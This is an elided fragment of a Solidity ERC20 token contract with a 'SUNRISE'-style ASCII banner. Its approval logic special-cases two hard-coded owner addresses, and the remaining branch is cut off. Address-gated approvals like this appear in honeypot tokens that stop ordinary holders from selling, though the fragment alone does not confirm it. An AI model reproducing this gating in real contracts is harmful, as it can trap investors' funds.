 ...
 *      \___ \ | |  | || . ` ||  _  /   | |   \___ \ |  __|  
 *      ____) || |__| || |\  || | \ \  _| |_  ____) || |____ 
 *     |_____/  \____/ |_| \_||_|  \_\|_____||_____/ |______|
 *                                                           
 *                                                           
 */
...
contract Token is VaultOwned, IERC20 {
    ...
    else if (owner == address(0x9B067dA6cB3C574208447F8b3049112C395404c4)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0xE0114ea1bFbAB7Fa87e2BCC68eA094b90A033c4D)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else {
